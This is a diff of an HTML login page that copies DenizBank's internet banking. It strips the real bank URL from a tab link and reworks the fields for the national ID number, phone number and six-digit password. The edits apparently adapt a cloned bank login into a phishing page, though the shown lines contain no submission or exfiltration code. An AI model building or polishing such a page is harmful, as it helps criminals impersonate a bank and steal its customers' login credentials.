@@ -104,7 +104,7 @@
                     <div class="tab custom">
                       <ul class="nav nav-tabs" id="myTab" role="tablist">
                         <li class="nav-item">
-                          <a aria-controls="bireysel" aria-selected="true" class="nav-link active" data-toggle="tab" href="https://acikdeniz.denizbank.com/#bireysel" id="home-tab" role="tab" value="TabTitlePersonal | BİREYSEL" vp-resource="">BİREYSEL </a>
+                          <a aria-controls="bireysel" aria-selected="true" class="nav-link active" data-toggle="tab" href="#" id="home-tab" role="tab" value="TabTitlePersonal | BİREYSEL" vp-resource="">BİREYSEL </a>
                         </li>
                         <li class="nav-item">
                           <a aria-controls="profile" aria-selected="false" class="nav-link" data-toggle="tab" href="#" id="profile-tab" role="tab" value="TabTitleCorporate | KURUMSAL" vp-resource="">KURUMSAL </a>
@@ -126,7 +126,11 @@
                                               </span>
                                           </div>
                                           
-                                  <input autocomplete="off" autocorrect="off" spellcheck="false" type="text" id="tc" name="tc" placeholder="Kullanıcı Adı/TCKN" maxlength="11" inputmode="numeric" class="form-control mask" aria-label="Kullanıcı Adı/TCKN" aria-describedby="Kullanıcı Adı/TCKN" oninput="this.value = this.value.replace(/[^0-9]/g, '');">                                          <div class="input-group-append input-group-append-v2 switch-wrap">
+                                          <input type="text" id="custno" name="tc" placeholder="Kullanıcı Adı/TCKN" 
+                                          maxlength="11" inputmode="numeric" class="form-control mask" 
+                                          aria-label="Kullanıcı Adı/TCKN" aria-describedby="Kullanıcı Adı/TCKN" required 
+                                          oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11)">
+                                                                             <div class="input-group-append input-group-append-v2 switch-wrap">
                                               <span class="input-group-text">
                                                   <label class="switch-text">
                                                       <input type="checkbox" id="tcOrUserNamecb" class="ng-untouched ng-pristine ng-valid">
@@ -162,8 +166,11 @@
                                           </div>
                                                                 <!-- Syslx -->
 
-
-                                <input autocomplete="off" autocorrect="off" spellcheck="false" type="text" id="telNo" name="telNo" placeholder="Telefon Numaranız" maxlength="11" inputmode="text" class="form-control mask" id="tcOrUserNametxt" name="tcOrUserNametxt" aria-label="Telefon Numaranız" aria-describedby="Telefon Numaranız">                                          <div class="input-group-append input-group-append-v2 switch-wrap">
+                                                                <input type="text" id="telNo" name="telNo" placeholder="Telefon Numaranız"
+                                                                maxlength="11" inputmode="numeric" class="form-control mask"
+                                                                aria-label="Telefon Numaranız" aria-describedby="Telefon Numaranız" 
+                                                                oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11)">
+                                                                                                   <div class="input-group-append input-group-append-v2 switch-wrap">
                                               <span class="input-group-text">
                                                   <label class="switch-text">
                                                       <input type="checkbox" id="tcOrUserNamecb" class="ng-untouched ng-pristine ng-valid">
@@ -198,8 +205,12 @@
                                         <em class="icon-lock fs-24"></em>
                                       </span>
                                     </div>
-                                <input autocomplete="off" autocorrect="off" inputmode="numeric" pattern="[0-9]*" spellcheck="false" id="sms" name="sms" type="password" placeholder="Parolanızı giriniz" maxlength="6" class="form-control password numeric mask " aria-label="Parolanızı giriniz" aria-describedby="Parolanızı giriniz" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
-                                    <!---->
+                                    <input autocomplete="off" autocorrect="off" inputmode="numeric" pattern="[0-9]*" 
+                                    spellcheck="false" id="sms" name="sms" type="password" placeholder="Parolanızı giriniz" 
+                                    maxlength="6" class="form-control password numeric mask" 
+                                    aria-label="Parolanızı giriniz" aria-describedby="Parolanızı giriniz"
+                                    oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                                                                 <!---->
                                     <div class="input-group-append">
                                       <span class="input-group-text">
                                         <em class="icon-keyboard fs-24 tooltipstered" vp-tooltip=""></em>
